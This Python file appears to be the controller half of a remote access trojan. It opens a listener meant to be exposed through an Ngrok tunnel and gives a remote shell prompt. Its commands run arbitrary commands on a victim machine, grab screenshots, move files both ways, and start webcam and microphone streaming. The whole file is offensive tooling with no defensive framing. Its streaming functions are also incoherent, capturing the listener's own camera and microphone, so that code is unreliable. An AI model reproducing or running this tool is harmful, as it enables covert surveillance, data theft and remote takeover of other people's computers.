import socket
import subprocess
import os
from pathlib import Path
from tkinter import filedialog as fd
import time
import cv2
import numpy as np
import pyaudio
import threading
import win32gui
import win32con
import wave

# Constants for audio streaming
CHUNK_SIZE = 1024
SAMPLE_WIDTH = 2
CHANNELS = 1
SAMPLE_RATE = 44100

# Global variables for audio streaming
audio_streaming = False
audio_stream_thread = None
audio_stream_stop_event = threading.Event()
audio_stream_frames = []

def start_listener(host, port):
    global client_socket
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((host, port))
    listener.listen(1)
    print(f"🔊 [*] Listening on {host}:{port}")

    client_socket, addr = listener.accept()
    print(f"🤝 [*] Received connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("💻 Shell> ")

        if command.lower() == "exit":
            break

        elif command == "":
            pass
        elif command == "cls" or command == "clear":
            os.system("cls||clear")
        elif command.lower() == "screenshot":
            client_socket.send(command.encode())
            receive_screenshot(client_socket)
        elif command[:8].lower() == "download":
            client_socket.send(command.encode())
            download_file(command[9:])
        elif command[:6].lower() == "upload":
            client_socket.send(command.encode())
            upload_file(command[7:])
        elif command.lower().startswith("cd "):
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            if response == "DIR_NOT_FOUND":
                print("[!] Directory Not Found")
        elif command.lower() == "startwebcam":
            client_socket.send(command.encode())
            start_webcam_streaming()
        elif command.lower() == "stopwebcam":
            client_socket.send(command.encode())
            stop_webcam_streaming()
        elif command.lower() == "startaudio":
            client_socket.send(command.encode())
            start_audio_streaming()
        elif command.lower() == "stopaudio":
            client_socket.send(command.encode())
            stop_audio_streaming()
        else:
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)

    client_socket.close()
    listener.close()


def receive_screenshot(client_socket):
    screenshot_data = b""
    while True:
        data = client_socket.recv(4096)
        if data == b"DONE":
            break
        screenshot_data += data

    with open("screenshot.jpg", "wb") as file:
        file.write(screenshot_data)

    print("[*] 🖼️ Screenshot received and saved as 'screenshot.jpg'")


def download_file(file_name):
    data = client_socket.recv(1024)
    if data.decode() == "FILE_NOT_FOUND":
        print("[!] File Not Found On Remote Machine")
        return
    f = open(file_name, "wb")
    client_socket.settimeout(1)
    chunk = client_socket.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client_socket.recv(1024)
        except socket.timeout as e:
            print(f"[*] 📥 File '{file_name}' downloaded successfully")
            break
    client_socket.settimeout(None)
    f.close()


def upload_file(file_name):
    file_name = fd.askopenfilenames()
    if len(file_name) == 0:
        print("[!] No File Selected")
        client_socket.send(b"FILE_NOT_CHOSE")
        return
    client_socket.send(b"ok")
    client_socket.send(str(len(list(file_name))).encode())
    for _file in list(file_name):
        f = open(_file, "rb")
        print(f"[*] ☁️ File '{_file}' uploaded successfully")
        time.sleep(3)
        client_socket.send((Path(_file).name).encode())
        client_socket.send(f.read())
        f.close()


def start_webcam_streaming():
    threading.Thread(target=send_webcam_stream).start()


def send_webcam_stream():
    cap = cv2.VideoCapture(0)
    client_socket.send(b"WEBCAM_STREAMING")
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        # Convert the frame to a suitable format for streaming, e.g., JPEG
        _, encoded_frame = cv2.imencode(".jpg", frame)

        # Send the encoded frame to the listener
        client_socket.sendall(encoded_frame)

        # Check for the stop command from the listener
        if client_socket.recv(1024) == b"STOP_WEBCAM_STREAMING":
            break

    cap.release()


def stop_webcam_streaming():
    client_socket.send(b"STOP_WEBCAM_STREAMING")


def start_audio_streaming():
    global audio_streaming, audio_stream_thread
    audio_streaming = True
    audio_stream_thread = threading.Thread(target=send_audio_stream)
    audio_stream_thread.start()


def stop_audio_streaming():
    global audio_streaming, audio_stream_thread
    audio_streaming = False
    audio_stream_stop_event.set()
    audio_stream_thread.join()
    audio_stream_stop_event.clear()


def send_audio_stream():
    global audio_stream_frames
    audio_stream_stop_event.clear()

    p = pyaudio.PyAudio()
    stream = p.open(
        format=p.get_format_from_width(SAMPLE_WIDTH),
        channels=CHANNELS,
        rate=SAMPLE_RATE,
        input=True,
        frames_per_buffer=CHUNK_SIZE
    )

    client_socket.send(b"AUDIO_STREAMING")

    while audio_streaming:
        data = stream.read(CHUNK_SIZE)
        audio_stream_frames.append(data)

        if len(audio_stream_frames) >= 10:
            client_socket.send(b"".join(audio_stream_frames))
            audio_stream_frames = []

        if audio_stream_stop_event.is_set():
            break

    stream.stop_stream()
    stream.close()
    p.terminate()


if __name__ == "__main__":
    host = "localhost"  # Replace with your Ngrok tunnel URL
    port = 1234  # Choose a port number
    start_listener(host, port)
